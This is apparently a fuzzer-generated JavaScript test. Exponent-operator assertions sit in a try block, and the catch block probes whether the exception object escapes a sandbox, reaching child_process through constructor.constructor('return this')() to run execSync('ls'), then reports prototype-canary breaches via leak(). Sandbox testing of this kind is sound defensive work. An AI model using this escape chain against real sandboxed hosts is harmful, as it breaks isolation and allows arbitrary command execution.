try {
    var exponent = 2;
    assert.sameValue(2 ** 3, 8, '(2 ** 3) === 8');
    assert.sameValue(3 * 2 ** 3, 24, '(3 * 2 ** 3) === 24');
    assert.sameValue(2 ** ++exponent, 8, '(2 ** ++exponent) === 8');
    assert.sameValue(2 ** -1 * 2, 1, '(2 ** -1 * 2) === 1');
    assert.sameValue(2 ** 2 * 4, 16, '(2 ** 2 * 4) === 16');
    assert.sameValue(2 ** 2 / 2, 2, '(2 ** 2 / 2) === 2');
    assert.sameValue(2 ** 3 ** 2, 512, '(2 ** (3 ** 2)) === 512');
    assert.sameValue(2 ** 3 ** 2, 512, '(2 ** 3 ** 2) === 512');
    assert.sameValue(16 / 2 ** 2, 4, '(16 / 2 ** 2) === 4');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}